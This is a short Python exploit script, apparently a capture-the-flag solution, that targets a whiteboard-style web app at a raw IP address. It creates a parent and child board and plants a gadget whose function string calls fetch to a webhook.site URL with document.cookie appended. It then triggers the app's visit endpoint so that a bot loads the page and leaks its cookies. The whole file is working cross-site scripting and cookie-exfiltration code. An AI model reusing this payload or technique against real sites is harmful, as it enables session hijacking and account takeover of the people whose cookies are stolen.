import requests, uuid, json

BASE_API_URL = "http://43.199.77.191:25054"
BASE_URL = "http://43.199.77.191:25053"

res = requests.post(f"{BASE_API_URL}/board")
parent_board = res.json()["board"]["id"]
res = requests.post(f"{BASE_API_URL}/board")
child_board = res.json()["board"]["id"]

gadget1 = uuid.uuid4().hex
gadget2 = uuid.uuid4().hex

res = requests.put(
    f"{BASE_API_URL}/board/" + parent_board,
    json.dumps(
        {
            "content": {
                gadget1: {
                    "id": gadget1,
                    "type": "gadget.board",
                    "boardId": child_board,
                    "top": 0,
                    "left": 0,
                }
            }
        }
    ),
    headers={"Content-type": "application/json"},
)

res = requests.put(
    f"{BASE_API_URL}/board/" + child_board,
    json.dumps(
        {
            "content": {
                gadget2: {
                    "id": gadget2,
                    "type": "functions.sendToParent",
                    "arguments": [],
                    "functionString": "fetch('https://webhook.site/0710bed1-1bdd-4247-8e90-341590faf486?'+document.cookie)",
                    "executeFunction": True,
                }
            }
        }
    ),
    headers={"Content-type": "application/json"},
)

requests.post(
    f"{BASE_API_URL}/visit",
    json.dumps({"dest": f"{BASE_URL}/" + parent_board}),
    headers={"Content-type": "application/json"},
)

print(f"{BASE_URL}/" + parent_board)
